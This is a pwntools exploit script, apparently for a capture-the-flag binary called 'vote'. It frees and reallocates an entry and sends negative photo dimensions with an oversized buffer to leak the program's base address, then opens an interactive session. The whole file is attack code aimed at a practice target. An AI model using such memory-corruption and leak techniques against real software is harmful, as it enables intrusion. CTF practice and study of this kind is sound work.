from pwn import *
io = process("./vote",aslr=False)

def add_ctf(idx,name,topic_cnt,do_photo,width,height,photo,topics=[]):
    io.sendlineafter(b"input:",b"1")
    io.sendlineafter(b"idx",str(idx).encode())
    io.sendlineafter(b"name",name)
    io.sendlineafter(b"topic cnt",str(topic_cnt).encode())

    for i in range(topic_cnt):
        io.sendlineafter(b"topic>",topics[i])

    if do_photo:
        io.sendlineafter(b"photo?",b"y")
        io.sendlineafter(b"width?",str(width).encode())
        io.sendlineafter(b"height",str(height).encode())
        io.sendafter(b"reading photo below>>",photo)  

    else:
         io.sendlineafter(b"photo?",b"n")

def vote_ctf(idx):
    io.sendlineafter(b"input:",b"2")
    io.sendlineafter(b" ctf idx:",str(idx).encode())

def remove_ctf(idx):
    io.sendlineafter(b"input:",b"3")
    io.sendlineafter(b"idx?",str(idx).encode())


add_ctf(0,"AAAA",0,False,0,0,0)
add_ctf(1,"BBBB",0,False,0,0,0)
remove_ctf(0)

exploit = b"A"*0x900 + p64(0x1337133713371337) + b"A"*0x20
add_ctf(0,"CCCC",0,True,-32767,-1,exploit)
io.recvuntil(p64(0x1337133713371337))
io.recv(0x20)
pie = u64(io.recv(6) + b"\x00\x00") - 0x7c80
log.info("PIE :" + hex(pie))

#gdb.attach(io,gdbscript="break *0x555555556eca\n")
io.interactive()
